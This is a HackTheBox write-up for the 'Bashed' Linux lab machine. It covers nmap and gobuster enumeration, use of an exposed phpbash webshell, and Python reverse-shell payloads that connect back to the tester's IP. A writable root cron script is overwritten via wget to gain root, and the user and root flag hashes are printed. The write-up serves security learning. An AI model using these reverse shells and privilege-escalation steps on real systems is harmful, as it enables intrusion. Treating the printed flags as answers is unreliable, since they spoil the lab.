---
title: HackTheBox - Bashed w/o Metasploit
publishDate: 2023-09-04
author: Abhinav Kumar
image:   '~/assets/images/htb-bashed.png'
excerpt: HackTheBox Bashed machine is a Linux machine that is based on misconfigurations around Webshell and permissions.
draft: false
category: HackTheBox
tags: 
    - linux machine
    - easy
---

# Bashed

HackTheBox Link to Bashed Machine - [HTB-Bashed](https://app.hackthebox.com/machines/bashed)

## Nmaping Bashed

Adding hosts file entry for bashed
```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ echo '10.10.10.68 bashed.htb' | sudo tee /etc/hosts
[sudo] password for abhinav: 
10.10.10.68 bashed.htb
```
nmap scan 
Nmap scan says to try -Pn as host seems down.
After -Pn switch we see 2 ports.

```bash                                                                         
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap bashed.htb 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 01:59 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds

#adding  -Pn   switch                                                                          
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap bashed.htb -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 01:59 IST
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
80/tcp    open     http
27000/tcp filtered flexlm0

Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

Running a Service Scan on these ports, along with scanning all ports for TCP and UDP to find any additional points.

```bash
                                                                               
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap -sC -sV -A -p80,27000 bashed.htb -Pn 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 02:08 IST
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.17s latency).

PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
27000/tcp closed flexlm0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
```

The Webpage has below description (screenshot).

The description given on the Webpage says it acts as a webshell and we should find one.


![WebPage - bashed - HTB](~/assets/images/htb-bashed-webpage.png)


Lets find the webshell.

Running Gobuster on the website gives the following results.
```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ gobuster dir -u  http://bashed.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --threads 200 --quiet
/images               (Status: 301) [Size: 309] [--> http://bashed.htb/images/]
/php                  (Status: 301) [Size: 306] [--> http://bashed.htb/php/]
/css                  (Status: 301) [Size: 306] [--> http://bashed.htb/css/]
/dev                  (Status: 301) [Size: 306] [--> http://bashed.htb/dev/]
/js                   (Status: 301) [Size: 305] [--> http://bashed.htb/js/]
/uploads              (Status: 301) [Size: 310] [--> http://bashed.htb/uploads/]
/fonts                (Status: 301) [Size: 308] [--> http://bashed.htb/fonts/]
```



### Initial Shell


While uploads and images or other directories does not contains much, /dev directory has a webshell present. 

![HTB-Bashed WebShell](~/assets/images/htb-bashed-webshell1.png)


Clicking on the phpbash.php, we get to a webshell. Where we can see we are running as www-data user.

![HTB-Bashed-WebShell](~/assets/images/htb-bashed-webshell2.png)

Type / copy paste the below to get a reverse shell , simultaneously fire up a netcat listner.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.30",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

In netcat listner we can see we got connection/shell back.
```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 7777   
listening on [any] 7777 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.68] 46602
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls /home
arrexel
scriptmanager
```

### User Flag,

Let us get the user flag.
We see two user and one of these has the user flag that we now can get.

```bash
$ cd arrexel
$ ls
user.txt
$ cat user.txt
57c8f5fb610baf65badd72c52c674767
```

### Privilege Escalation

Checking what privileges we have, we discover scriptmanager user has some, which we enumerate further.

We assume scriptmanager role by - sudo -i -u scriptmanager
```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.68] 46604
/bin/sh: 0: can't access tty; job control turned off
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

```bash
$ sudo -i -u scriptmanager
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

We check the direcotries and discover scrpts directory writable by scriptmanager


```bash
ls -la /
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            174 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Sep  3 13:20 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 173 root          root              0 Sep  3 13:20 proc
drwx------   3 root          root           4096 Jun  2  2022 root
drwxr-xr-x  18 root          root            520 Sep  4 06:25 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Sep  3 13:20 sys
drwxrwxrwt  10 root          root           4096 Sep  4 07:45 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

The content of directory are two files.
The file - test.py can be overwritten by scriptmanager user.

```bash
$ sudo -i -u scriptmanager
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
cd /scripts
ls -l
total 12
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4 2017 test.py
-rw-r--r-- 1 root          root           12 Sep  4 07:50 test.txt
```

```python
# Read test.py file
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

# Read test.txt file
cat test.txt
testing 123!
```

We can notice the test.py runs and writes to file - test.txt, the thing to notice is test.txt is saved / owned by root. The file timestamp of test.txt is also very very recent, suggesting the file test.py is run via cron job , and run as root.

Since we can overwrite test.py, let us hack it to run the code we provide ( to get reverse shell ).

Save the below on your local machine (replacing IP and port as required), with name test.py.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Change the IP below to your VPN (tun0) IP and any port.
s.connect(("10.10.14.15",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Grant the test.py file 777 permission.
And start a local python server to upload the file to remote machine.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ chmod 777 test.py
```

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ python -m http.server 7766  #Python3 HTTP.Server
Serving HTTP on 0.0.0.0 port 7766 (http://0.0.0.0:7766/) ...

#when the file is uploaded, the below line would be returned
10.10.10.68 - - [04/Sep/2023 20:27:21] "GET /test.py HTTP/1.1" 200 -
```

Now Get the file via curl or Wget to the machine, overwrite on the same file test.py .
I copied the file via cp , test.py.1 --> test.py.

```bash
wget 10.10.14.15:7766/test.py  #Get the file from our local machine.
--2023-09-04 07:49:38--  http://10.10.14.15:7766/test.py
Connecting to 10.10.14.15:7766... connected.
HTTP request sent, awaiting response... 200 OK
Length: 226 [text/x-python]
Saving to: 'test.py.1'   #since a file test.py already exists, it is appending 1 to it.

     0K                                                       100% 5.61M=0s

2023-09-04 07:49:39 (5.61 MB/s) - 'test.py.1' saved [226/226]

ls -l
total 12
-rw-r--r-- 1 scriptmanager scriptmanager  58 Dec  4  2017 test.py
-rw-r--r-- 1 scriptmanager scriptmanager 226 Sep  4 07:48 test.py.1
-rw-r--r-- 1 root          root           12 Sep  4 07:50 test.txt

# Overwrite / Copy test.py.1 --> test.py
cp test.py.1 test.py

# Check if overwritten
cat test.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.15”,8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);

# Chekcing onemore time, the file size is same .
ls -l
total 12
-rw-r--r-- 1 scriptmanager scriptmanager 226 Sep  4 07:50 test.py
-rw-r--r-- 1 scriptmanager scriptmanager 226 Sep  4 07:48 test.py.1
-rw-r--r-- 1 root          root           12 Sep  4 07:50 test.txt
```

Also start a listner on netcat on the port specified in test.py file.
and wait a minute for the cron job to be executed .
Notice the root shell(#) on netcat listner.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 8888   #Starting Netcat Listner on port we speified in test.py files
listening on [any] 8888 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.68] 33320
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

root flag:
```bash
#Reading the /root/root.txt flag
cat /root/root.txt
28975174abf7e96d935c3df1965881ca
```


## Learnings

1- Overly permissive misconfigurations should be looked for, here was scriptmanager user.

2- WebShell exposure to public even when not linked to webpage, should be avoided. We discovered this via gobuster.